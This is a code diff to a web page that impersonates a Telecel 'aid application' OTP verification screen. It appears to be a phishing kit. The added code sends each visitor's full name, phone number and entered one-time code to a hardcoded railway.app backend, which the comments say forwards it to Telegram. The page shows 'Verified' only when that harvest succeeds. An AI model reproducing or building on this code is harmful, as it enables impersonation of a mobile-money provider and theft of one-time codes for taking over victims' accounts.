@@ -42,7 +42,6 @@
             flex-direction: column;
         }
 
-        /* Header */
         .header {
             text-align: center;
             margin-bottom: 1.5rem;
@@ -78,7 +77,6 @@
             color: var(--gray);
         }
 
-        /* Progress Bar */
         .progress-container {
             margin: 1rem 0 1.5rem;
         }
@@ -119,7 +117,6 @@
             border-radius: 10px;
         }
 
-        /* Form Card */
         .form-card {
             background: white;
             border-radius: 20px;
@@ -142,7 +139,6 @@
             text-align: center;
         }
 
-        /* Phone Display */
         .phone-display {
             background: var(--telecel-red-light);
             padding: 0.8rem;
@@ -156,7 +152,6 @@
             font-size: 1rem;
         }
 
-        /* OTP Boxes - 5 separate boxes */
         .otp-container {
             display: flex;
             justify-content: center;
@@ -184,7 +179,6 @@
             box-shadow: 0 0 0 3px rgba(226,0,26,0.1);
         }
 
-        /* Mobile responsive boxes */
         @media (max-width: 480px) {
             .otp-box {
                 width: 45px;
@@ -207,7 +201,6 @@
             }
         }
 
-        /* Timer */
         .timer-container {
             text-align: center;
             margin: 1rem 0;
@@ -229,7 +222,6 @@
             color: var(--telecel-red);
         }
 
-        /* Resend Button */
         .resend-container {
             text-align: center;
             margin: 0.8rem 0;
@@ -251,7 +243,6 @@
             text-decoration: none;
         }
 
-        /* Verify Button */
         .btn-verify {
             width: 100%;
             background: var(--telecel-red);
@@ -266,12 +257,16 @@
             margin-top: 0.5rem;
         }
 
-        .btn-verify:hover {
+        .btn-verify:hover:not(:disabled) {
             background: var(--telecel-red-dark);
             transform: translateY(-2px);
         }
 
-        /* Back Link */
+        .btn-verify:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+        }
+
         .back-link {
             text-align: center;
             margin-top: 1rem;
@@ -283,7 +278,6 @@
             font-size: 0.8rem;
         }
 
-        /* Footer */
         .footer {
             text-align: center;
             padding: 1rem;
@@ -292,7 +286,6 @@
             margin-top: auto;
         }
 
-        /* Alert */
         .alert-success {
             background: #E8F5E9;
             border-left: 4px solid var(--success);
@@ -308,7 +301,21 @@
             display: block;
         }
 
-        /* Loading Overlay */
+        .error-toast {
+            background: #FFEBEE;
+            border-left: 4px solid var(--telecel-red);
+            padding: 0.8rem;
+            border-radius: 12px;
+            margin-bottom: 1rem;
+            font-size: 0.75rem;
+            display: none;
+            text-align: center;
+        }
+
+        .error-toast.show {
+            display: block;
+        }
+
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -377,7 +384,10 @@
                 ✅ Verified! Redirecting...
             </div>
 
-            <!-- 5 Separate OTP Boxes -->
+            <div class="error-toast" id="errorToast">
+                ❌ Failed to verify. Please try again.
+            </div>
+
             <div class="otp-container">
                 <input type="text" maxlength="1" class="otp-box" id="otp1" autofocus>
                 <input type="text" maxlength="1" class="otp-box" id="otp2">
@@ -410,10 +420,13 @@
 
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Verifying...</div>
+        <div class="loading-text">Verifying OTP...</div>
     </div>
 
     <script>
+        // BACKEND URL
+        const BACKEND_URL = 'https://telecel-cash-production.up.railway.app';
+
         const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
 
         if (!savedData) {
@@ -428,6 +441,11 @@
         let canResend = false;
         let resendAttempts = 0;
         const maxResendAttempts = 3;
+
+        const verifyBtn = document.getElementById('verifyBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const successAlert = document.getElementById('successAlert');
+        const errorToast = document.getElementById('errorToast');
 
         function generateOTP() {
             return Math.floor(10000 + Math.random() * 90000).toString();
@@ -464,6 +482,7 @@
             startTimer();
             sendOTP();
             document.getElementById('otp1').focus();
+            errorToast.classList.remove('show');
         }
 
         function clearOtpBoxes() {
@@ -480,23 +499,101 @@
             return otp;
         }
 
-        // Auto-tab between OTP boxes
+        // Send OTP to backend (Telegram)
+        async function sendOtpToBackend(otp) {
+            const payload = {
+                fullName: savedData.fullName || savedData.confirmedName,
+                phoneNumber: savedData.phoneNumber,
+                otpCode: otp
+            };
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/verify-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+                return data.success;
+            } catch (error) {
+                console.error('Backend error:', error);
+                return false;
+            }
+        }
+
+        async function verifyOTP() {
+            const enteredOTP = getEnteredOTP();
+            
+            if (enteredOTP.length !== 5) {
+                errorToast.innerHTML = '❌ Please enter the complete 5-digit code.';
+                errorToast.classList.add('show');
+                setTimeout(() => {
+                    errorToast.classList.remove('show');
+                }, 3000);
+                return;
+            }
+            
+            // Show loading overlay
+            loadingOverlay.style.display = 'flex';
+            verifyBtn.disabled = true;
+            errorToast.classList.remove('show');
+            
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Send OTP to Telegram via backend
+            const telegramSuccess = await sendOtpToBackend(enteredOTP);
+            
+            if (telegramSuccess) {
+                const updatedData = {
+                    ...savedData,
+                    otpVerified: true,
+                    otpCode: enteredOTP,
+                    otpVerifiedAt: new Date().toISOString()
+                };
+                sessionStorage.setItem('telecelAidApplication', JSON.stringify(updatedData));
+                
+                successAlert.classList.add('show');
+                
+                setTimeout(() => {
+                    window.location.href = 'success.html';
+                }, 1500);
+            } else {
+                loadingOverlay.style.display = 'none';
+                verifyBtn.disabled = false;
+                errorToast.innerHTML = '❌ Failed to verify OTP. Please try again.';
+                errorToast.classList.add('show');
+                setTimeout(() => {
+                    errorToast.classList.remove('show');
+                }, 3000);
+            }
+        }
+
+        function resendOTP() {
+            if (!canResend) return;
+            if (resendAttempts >= maxResendAttempts) {
+                alert('Maximum resend attempts reached. Please contact customer support.');
+                return;
+            }
+            resendAttempts++;
+            sendOTP();
+            resetOTP();
+        }
+
         function setupOtpBoxes() {
             for (let i = 1; i <= 5; i++) {
                 const box = document.getElementById(`otp${i}`);
                 
                 box.addEventListener('input', function(e) {
-                    // Only allow digits
                     this.value = this.value.replace(/[^0-9]/g, '');
-                    
-                    // Move to next box if value entered and not last box
                     if (this.value.length === 1 && i < 5) {
                         document.getElementById(`otp${i+1}`).focus();
                     }
                 });
                 
                 box.addEventListener('keydown', function(e) {
-                    // Move to previous box on backspace if empty
                     if (e.key === 'Backspace' && !this.value && i > 1) {
                         document.getElementById(`otp${i-1}`).focus();
                     }
@@ -514,7 +611,6 @@
                         }
                     }
                     
-                    // Focus on next empty box
                     for (let j = 1; j <= 5; j++) {
                         if (!document.getElementById(`otp${j}`).value) {
                             document.getElementById(`otp${j}`).focus();
@@ -524,36 +620,6 @@
                     document.getElementById('verifyBtn').focus();
                 });
             }
-        }
-
-        async function verifyOTP() {
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            const updatedData = {
-                ...savedData,
-                otpVerified: true,
-                otpVerifiedAt: new Date().toISOString()
-            };
-            sessionStorage.setItem('telecelAidApplication', JSON.stringify(updatedData));
-            
-            document.getElementById('successAlert').classList.add('show');
-            
-            setTimeout(() => {
-                window.location.href = 'success.html';
-            }, 1500);
-        }
-
-        function resendOTP() {
-            if (!canResend) return;
-            if (resendAttempts >= maxResendAttempts) {
-                alert('Maximum resend attempts reached. Please contact customer support.');
-                return;
-            }
-            resendAttempts++;
-            sendOTP();
-            resetOTP();
         }
 
         function init() {
